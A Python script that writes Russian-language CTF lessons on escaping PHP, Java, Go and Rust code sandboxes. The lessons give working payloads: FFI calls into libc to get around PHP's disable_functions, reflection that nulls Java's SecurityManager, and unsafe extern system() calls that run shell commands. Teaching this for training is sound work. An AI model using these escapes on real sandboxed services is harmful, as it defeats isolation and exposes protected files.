#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Second expansion for MIS-GAP-4a lessons — worked cases to reach >=1200 words."""
import re

CONTENT = 'content/misc/'


def add(lesson, text):
    p = CONTENT + lesson + '.md'
    s = open(p, encoding='utf-8').read()
    add_txt = text.strip()
    m = re.search(r'^## Квиз\s*$', s, re.MULTILINE)
    out = s[:m.start()] + add_txt + '\n\n' + s[m.start():]
    open(p, 'w', encoding='utf-8').write(out)
    print('expanded2', lesson)


add('misc-php-sandbox', '''
## Разбор реального кейса: панель на shared-хостинге

Представь типичную задачу: есть endpoint `run.php`, который исполняет код под отдельным пользователем `www-data`, а на диске рядом с ним лежит `flag.txt`, доступный только на чтение. Список запрещённых функций средний: `exec, system, shell_exec, passthru, proc_open, popen, pcntl_exec`. Разберём решение по шагам, проговаривая каждую команду.

Шаг 1 — понять конфигурацию. Запрашиваем два ключа конфигурации:

```
$ curl -s 'http://sandbox.local/run.php' --data-urlencode 'code=var_dump(ini_get("disable_functions"), ini_get("open_basedir"), extension_loaded("FFI"));'
string(58) "exec,passthru,shell_exec,system,proc_open,popen,pcntl_exec"
string(11) "/var/www/ht"
bool(true)
```

Читаем вывод: запуск процессов закрыт по именам, файлы ограничены каталогом `/var/www/ht`, а расширение FFI включено. Последний факт делает задачу простой: FFI зовёт libc напрямую.

Шаг 2 — проверить, что FFI действительно работает и не режется `open_basedir`:

```
$ curl -s '...' --data-urlencode 'code=$f=FFI::cdef("int getuid(void);","libc.so.6"); var_dump($f->getuid());'
int(33)
```

`getuid` вернул 33 (`www-data`) — FFI живой, и это уже системный вызов, прошедший мимо `disable_functions`.

Шаг 3 — прочитать файл. `open_basedir` ограничивает PHP-функции вроде `file_get_contents`, но не `fopen` внутри libc. Через FFI открываем файл напрямую:

```
$ curl -s '...' --data-urlencode 'code=$f=FFI::cdef("char *fgets(char *s,int n,void *f); void *fopen(char*,char*);","libc.so.6"); $fp=$f->fopen("/var/www/ht/flag.txt","r"); $buf=FFI::new("char[128]"); $f->fgets($buf,128,$fp); echo FFI::string($buf);'
nto{...}
```

Флаг получен. Заметь цепочку: FFI → `fopen` из libc → чтение. Ни одна из «запрещённых» функций не вызывалась.

## Пошаговый протокол решения любой PHP-песочницы

1. Получить `disable_functions`, `open_basedir`, список расширений.
2. Проверить наличие FFI, `pcntl`, `mail`, `curl`, `imap`.
3. Если FFI есть — идти через libc (`fopen`, `system`, `popen`).
4. Если FFI нет — проверить `putenv`+`mail`/`error_log` (LD_PRELOAD).
5. Если и это закрыто — искать обход `open_basedir` (`/proc/self/root`, `glob://`).
6. Только после этого думать про эксплуатацию ОС.

## Частые ошибки новичка

- Пытаться вызвать `system` напрямую — он в списке, будет фатальная ошибка «call to disabled function».
- Забывать, что `open_basedir` применяется к PHP-функциям, но не к вызовам libc.
- Писать `.so` в `/tmp`, где стоит `noexec` — загрузка не сработает.
- Путать `disable_functions` (список имён) с `suhosin` (патч, фильтрующий по-другому).
''')

add('misc-java-sandbox', '''
## Разбор реального кейса: плагин с урезанными правами

Типовая задача: сервис загружает плагин и запускает его в JVM с включённым `SecurityManager`. Политика разрешает плагину читать только одно системное свойство. Плагину нужно прочитать `flag.txt`. Разберём путь решения.

Шаг 1 — понять, что запрещено. Пробуем простое:

```
> read /flag.txt
AccessControlException: access denied ("java.io.FilePermission" "/flag.txt" "read")
```

Проверка сработала. Теперь пробуем снять менеджер напрямую:

```
> System.setSecurityManager(null)
SecurityException: not allowed to set the security manager
```

Прямой путь закрыт — менеджер сам себя защищает.

Шаг 2 — добраться до поля рефлексией. В классе `System` поле `security` приватное. Рефлексия позволяет его прочитать и записать, если не запрещено `ReflectPermission("suppressAccessChecks")`:

```
> Field f = System.class.getDeclaredField("security"); f.setAccessible(true); f.set(null, null); print("done")
done
```

`setAccessible(true)` снял инкапсуляцию, `f.set(null, null)` обнулил менеджер. Теперь проверок нет.

Шаг 3 — прочитать файл обычными средствами:

```
> Files.readString(Path.of("/flag.txt"))
nto{...}
```

## Разбор: почему это сработало

Политика не перечисляла `ReflectPermission`. `setAccessible(true)` — привилегированная операция, но если её не запретили явно, она проходит. Дальше мы поменяли внутреннее состояние `System`, и все последующие проверки видят `security == null`. Это классика: модель безопасности сильна ровно настолько, насколько полно описана политика.

## Пошаговый протокол

1. Определить, какой менеджер активен (`System.getSecurityManager()`).
2. Попробовать `System.setSecurityManager(null)` — часто запрещено.
3. Достать поле `security` рефлексией и обнулить.
4. Если рефлексия закрыта — искать `Unsafe`, JNDI, десериализацию.
5. После снятия — читать файлы обычными API.

## Частые ошибки

- Считать, что `SecurityManager` — это песочница уровня ОС: он лишь спрашивает политику.
- Забывать про `doPrivileged`: доверенный код может сделать работу за вас.
- Не проверять версию JDK: в 17+ менеджер deprecated, в 21+ его нет, и задачи строятся иначе.
- Путать `ReflectPermission("suppressAccessChecks")` с общим правом на рефлексию.
''')

add('misc-go-sandbox', '''
## Разбор реального кейса: интерпретатор на go/ast

Задача: сервис принимает выражение, парсит его через `go/parser` и исполняет, разрешая только функции из белого списка. Нужно прочитать `flag.txt`. Разберём путь.

Шаг 1 — разведка белого списка. Отправляем заведомо запрещённое имя:

```
$ ./gosandbox 'readFile("/flag.txt")'
error: unknown function readFile
```

Значит, вызовы по имени фильтруются. Но что с импортами?

Шаг 2 — проверить, доступен ли `syscall`. Пробуем выражение, которое вызывает пакет напрямую (если интерпретатор собирает исходник и компилирует):

```
$ ./gosandbox 'syscall.Getpid()'
12345
```

Интерпретатор позволил `syscall` — фильтр проверяет имена функций, но не импорты пакетов. Это открытая дверь.

Шаг 3 — открыть и прочитать файл:

```
$ ./gosandbox 'fd,_:=syscall.Open("/flag.txt",0,0); b:=make([]byte,64); n,_:=syscall.Read(fd,b); string(b[:n])'
nto{...}
```

## Разбор: где ошибка песочницы

Песочница проверяла **имена вызываемых функций** в AST. Но `syscall` — это пакет, и его методы не перечислены. Кроме того, интерпретатор не изолировал процесс: тот же uid, тот же корень ФС. Правильная защита — `seccomp` с белым списком, а не анализ AST.

## Пошаговый протокол

1. Определить, что фильтруется (имена, импорты, типы).
2. Проверить доступность `syscall`, `unsafe`, `os/exec`, `plugin`, `reflect`.
3. Найти пакет, который не в фильтре, но даёт доступ к ФС/процессам.
4. Через `syscall.Open`+`Read` или `os.ReadFile` прочитать флаг.
5. Если всё закрыто — искать обход через `//go:linkname` к внутренним функциям.

## Частые ошибки

- Фильтровать строки исходника вместо исполнения в изолированном процессе.
- Забывать, что `reflect` позволяет вызвать метод по имени, обойдя таблицу.
- Оставлять `os/exec` в разрешённых крейтах.
- Полагаться на `unsafe`-запрет на уровне линтера: линтер не граница безопасности.
''')

add('misc-rust-sandbox', '''
## Разбор реального кейса: калькулятор с фильтром

Задача: сервис на Rust принимает выражение, парсит его и вычисляет, разрешая только арифметику. Нужно получить содержимое `flag.txt`. Разберём.

Шаг 1 — разведка. Отправляем недопустимую конструкцию:

```
$ ./rssandbox 'read("/flag.txt")'
error: only calc/abs are allowed
```

Шаг 2 — проверить, собирает ли песочница исходник из пользовательского ввода. Если да, можно подсунуть `unsafe` и FFI:

```
$ ./rssandbox 'unsafe{extern "C"{fn system(c:*const i8)->i32;} system(b"id\\0".as_ptr() as *const i8)}'
uid=1000(player) gid=1000
```

Компилятор принял `unsafe`-блок. Значит, песочница исполняет реальный Rust, а не ограниченный интерпретатор.

Шаг 3 — прочитать файл через тот же мост:

```
$ ./rssandbox 'unsafe{extern "C"{fn system(c:*const i8)->i32;} system(b"cat /flag.txt\\0".as_ptr() as *const i8)}'
nto{...}
```

## Разбор: почему фильтр не помог

Фильтр запрещал вызывать функции по именам (`read`), но `unsafe` и `extern "C"` — не функции, а конструкции языка. Песочница не запретила их, потому что анализировала вызовы, а не блоки `unsafe`. Настоящая граница — `seccomp` и отдельный процесс.

## Пошаговый протокол

1. Выяснить, интерпретирует ли песочница Rust или исполняет скомпилированный код.
2. Проверить доступность `unsafe`, `extern "C"`, `std::process`, `libc`.
3. Найти мост: FFI к `system`/`open`, `std::process::Command`, `std::fs`.
4. Прочитать флаг и вывести.
5. Если `unsafe` вырезан текстово — обойти через макросы, `include!`, юникод-трюки.

## Частые ошибки

- Верить, что «Rust безопасен, значит песочница безопасна».
- Фильтровать ключевые слова (`unsafe`) вместо запуска в изоляции.
- Забывать про `std::process`, который не требует FFI.
- Считать `transmute` безопасным только потому, что он в `std`.
''')

print('batch 4a expand2 done')
